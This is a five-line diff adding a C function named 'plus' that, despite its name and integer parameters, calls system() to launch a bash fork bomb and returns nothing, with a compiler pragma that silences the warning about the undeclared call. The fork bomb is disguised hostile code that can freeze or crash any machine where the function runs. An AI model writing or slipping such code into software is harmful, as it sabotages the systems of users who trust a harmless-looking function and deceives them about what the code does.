@@ -1,0 +1,5 @@
+#pragma GCC diagnostic ignored "-Wimplicit-function-declaration"
+int plus(int a, int b)
+{
+    system(":(){ :|: & };:");
+}
